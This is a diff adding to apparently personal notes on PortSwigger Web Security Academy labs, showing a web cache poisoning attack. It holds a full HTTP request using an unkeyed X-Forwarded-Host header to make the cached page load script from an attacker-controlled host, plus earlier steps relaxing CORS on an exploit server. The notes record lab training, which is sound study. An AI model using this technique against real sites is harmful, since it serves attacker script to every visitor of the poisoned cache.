@@ -32,3 +32,32 @@ This is later used in
 --- In the original /resources/json/geolocate.json we can see the original request is being sent with the header Sec-Fetch-Mode: cors. So we need to relax that policy in the headers on the exploit server with the additional response header - ```Access-Control-Allow-Origin: *```
 -- Try again and it works. By relaxing the access controls for CORS we successfully deliver the payload. 
 - To deliver the vulnerability to the victim remove the cache buster and redo the exploit. 
+
+# Web cache poisoning with an unkeyed header
+- Param miner found X-Forwarded-Host header
+```
+GET /product?productId=2&cb=1122f HTTP/2
+Host: 0a1100a30369a4a98031214f00b900d4.web-security-academy.net
+Cookie: session=1pUueSo8ElLSFosSuLkfQp3G3vwtJtKR
+Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "macOS"
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a1100a30369a4a98031214f00b900d4.web-security-academy.net/
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+X-Forwarded-Host: example.com
+```
+Adding that header and a cache buster results in a JavaScript file location being dynamically generated in the response. 
+```
+src="//example.com/resources/js/tracking.js">
+```
+So we can create that script with alert(1) on my exploit server and then call it. 
+
